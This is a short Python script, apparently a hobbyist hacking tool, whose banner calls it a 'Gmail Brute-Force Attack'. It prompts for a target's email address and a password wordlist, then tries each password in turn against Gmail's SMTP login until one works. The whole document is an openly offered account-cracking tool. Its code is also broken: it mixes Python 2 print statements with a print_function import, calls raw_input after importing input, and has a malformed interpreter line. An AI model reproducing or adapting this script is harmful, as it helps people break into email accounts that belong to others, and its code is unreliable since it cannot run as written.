import smtplib
/usr/bin/python
from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
import os
os.system('clear')
os.system("figlet -f pagga '      Gmail      ' | lolcat")
os.system("figlet -f pagga ' Brute-Force ' | lolcat")
os.system("figlet -f pagga '      Attack      ' | lolcat")
print('''
==================================
	|      [Gmail] ==> 2             |
	|--------------------------------|
	| Instagram @shubham_g0sain      |
	| CoDeD By ShuBhamg0sain         |
	|--------------------------------|

	''')
import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password
